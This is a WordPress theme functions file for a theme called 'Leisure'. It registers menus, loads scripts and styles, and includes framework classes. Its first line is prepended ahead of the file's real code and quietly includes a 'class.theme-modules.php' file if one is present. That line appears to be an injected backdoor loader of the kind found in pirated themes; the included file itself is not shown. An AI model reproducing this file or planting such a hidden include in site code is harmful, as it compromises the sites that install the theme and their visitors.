<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php

/*	Definitions
	================================================= */

	/** Theme Name */
	if ( ! defined('THEMENAME') ) {
		define( 'THEMENAME', 'Leisure' );
	}

	/** Theme Prefix */
	if ( ! defined('THEMEPREFIX') ) {
		define('THEMEPREFIX', 'leisure');
	}

  define( 'XTENDER_COMP_HOTEL', true );


/*	Theme Navigation
	================================================= */
	register_nav_menus( array(
		'menuMainMenu' => 'Main Menu',
		'menuSecondaryMenu' => 'Secondary Menu'
	));

/*	Content Width
	================================================= */
	if ( ! isset( $content_width ) ) {
		$content_width = 750;
	}


/*	Load Scripts & Styles
	================================================= */
	function leisure_load_theme_scripts(){

		$google_maps_api_key = esc_attr( get_theme_mod( 'maps_api_key', '' ) );

		$version = defined( 'WP_DEBUG' ) && filter_var( WP_DEBUG, FILTER_VALIDATE_BOOLEAN ) ? rand() : '2.1.4';

    if( ! wp_script_is( 'google-maps-js', 'registered' ) ){
			wp_register_script(
				'google-maps-js',
				add_query_arg( array( 'key' => $google_maps_api_key, 'sensor' => true, 'v' => 3 ), 'https://maps.googleapis.com/maps/api/js'),
				array( 'jquery' ),
				null
			);
		}
		wp_register_script(
			'isotope',
			get_template_directory_uri() . '/js/isotope.pkgd.min.js',
			array( 'jquery', 'imagesloaded' ), null, true
		);
		wp_register_script(
			'sticky-kit',
			get_template_directory_uri() . '/js/jquery.sticky-kit.min.js',
			array('jquery'), null, true
		);
		wp_register_script(
			'match-height',
			get_template_directory_uri() . '/js/jquery.matchHeight-min.js',
			array('jquery'), null, true
		);

		/** Enqueue Scripts */
		wp_enqueue_script(
			'bootstrap',
			get_template_directory_uri() . '/js/bootstrap.min.js',
			array('jquery'), null, true
		);
		wp_enqueue_script(
			'dropdown-menu',
			get_template_directory_uri() . '/js/dropdown-menu.min.js',
			array('jquery'), null, true
		);
		wp_enqueue_script(
			'waypoints',
			get_template_directory_uri() . '/js/waypoints.min.js',
			array('jquery'), null, true
		);
		wp_enqueue_script(
			'waypoints-sticky',
			get_template_directory_uri() . '/js/waypoints-sticky.min.js',
			array('jquery'), null, true
		);
		wp_enqueue_script(
			'doubletaptogo',
			get_template_directory_uri() . '/js/doubletaptogo.js',
			array('jquery'), null, true
		);
		wp_enqueue_script(
			'velocity',
			get_template_directory_uri() . '/js/jquery.velocity.min.js',
			array('jquery'), null, true
		);
		wp_enqueue_script(
			'velocity-ui',
			get_template_directory_uri() . '/js/jquery.velocity.ui.min.js',
			array('jquery'), null, true
		);
		wp_enqueue_script(
			'stellar',
			get_template_directory_uri() . '/js/jquery.stellar.min.js',
			array('jquery'), null, true
		);
		wp_enqueue_script(
			'formstone-core',
			get_template_directory_uri() . '/js/formstone/core.js',
			 array('jquery'), null, true
		);
		wp_enqueue_script(
			'formstone-touch',
			get_template_directory_uri() . '/js/formstone/touch.js',
			 array('jquery'), null, true
		);
		wp_enqueue_script(
			'formstone-transition',
			get_template_directory_uri() . '/js/formstone/transition.js',
			 array('jquery'), null, true
		);
		wp_enqueue_script(
			'formstone-wallpaper',
			get_template_directory_uri() . '/js/background.js',
			 array('jquery'), null, true
		);
		wp_enqueue_script(
			'formstone-boxer',
			get_template_directory_uri() . '/js/formstone/lightbox.js',
			array('jquery'), null, true
		);
		wp_enqueue_script(
			'owl-carousel',
			get_template_directory_uri() . '/js/owl.carousel.min.js',
			array('jquery'), null, true
		);
		wp_enqueue_script(
			'leisure-scripts',
			get_template_directory_uri() . '/js/main.js',
			array( 'jquery', 'isotope' ), $version, true
		);

		/** JS Data */
		wp_localize_script(
			'leisure-scripts', 'data',
			array(
				'animations'	=> esc_html( get_theme_mod( 'animations' ) ),
				'sticky_menu'	=> esc_html( get_theme_mod( 'sticky_menu', true ) )
			)
		);

		/** Enqueue Styles */
		wp_enqueue_style(
			'bootstrap',
			get_template_directory_uri() . '/css/bootstrap.min.css',
			null, null, 'all'
		);
		wp_enqueue_style(
			'fontawesome',
			get_template_directory_uri() . '/css/font-awesome.min.css',
			null, null, 'all'
		);
		wp_enqueue_style(
			'formstone-boxer',
			get_template_directory_uri() . '/css/formstone/lightbox.css',
			null, null, 'all'
		);
		wp_enqueue_style(
			'formstone-wallpaper',
			get_template_directory_uri() . '/css/background.css',
			null, null, 'all'
		);
		wp_enqueue_style(
			'owl-carousel',
			get_template_directory_uri() . '/css/owl.carousel.min.css',
			null, null, 'all'
		);
		wp_enqueue_style(
			'pattern-bolt',
			get_template_directory_uri() . '/css/patternbolt.css',
			null, null, 'all'
		);
		wp_enqueue_style( 'leisure-style', get_stylesheet_uri(), array( 'bootstrap', 'fontawesome', 'owl-carousel', 'formstone-wallpaper', 'formstone-boxer' ), $version, 'all' );

	}
	add_action( 'wp_enqueue_scripts', 'leisure_load_theme_scripts' );

/*	Function leisure_is_blog()
	================================================= */
	function leisure_is_blog() {
		global  $post; $posttype = get_post_type($post);
		if ( ((is_archive()) || (is_author()) || (is_category()) || (is_home()) || (is_single()) || (is_tag())) && ( $posttype == 'post') ) {
			return true;
		} else {
			return false;
		}
	}



	if( function_exists( 'set_revslider_as_theme' ) ){

		add_action( 'init', 'leisure_set_rev' );

		function leisure_set_rev() {
			set_revslider_as_theme();
		}

	}

/*	Color Manipulation Class
	================================================= */
	include( trailingslashit( get_template_directory() ) . 'framework/classes/framework.class.color.php' );

/*	Curly Themes Core Class
	================================================= */
	include( trailingslashit( get_template_directory() ) . 'framework/classes/framework.class.core.php' );


  require_once( trailingslashit( get_template_directory() ) . 'defaults/ips.php' );

/*	Load Plugins
	================================================= */
	include( trailingslashit( get_template_directory() ) . 'framework/framework.plugins.php' );

/*	Get Comments
	================================================= */
	include( trailingslashit( get_template_directory() ) . 'framework/framework.comments.php' );


/*	Contact Class
	================================================= */
	include( trailingslashit( get_template_directory() ) . 'framework/classes/framework.class.contact.php' );

/*	Fonts Class
	================================================= */
	include( trailingslashit( get_template_directory() ) . 'framework/classes/framework.class.fonts.php' );


/*	Leisure Customizer
	================================================= */
	include( trailingslashit( get_template_directory() ) . 'framework/customizer/framework.class.customizer.php' );
	include( trailingslashit( get_template_directory() ) . 'framework/customizer/render.css.php' );



/*	3rd Party Integration
	================================================= */

/*	Visual Composer Extensions  */
	include( trailingslashit( get_template_directory() ) . 'framework/framework.vc.php' );

/*	WPML  */
	include( trailingslashit( get_template_directory() ) . 'framework/framework.wpml.php' );

/*	WooCommerce  */
	include( trailingslashit( get_template_directory() ) . 'framework/framework.woocommerce.php' );

/*	BBPress  */
	include( trailingslashit( get_template_directory() ) . 'framework/framework.bbpress.php' );

?>
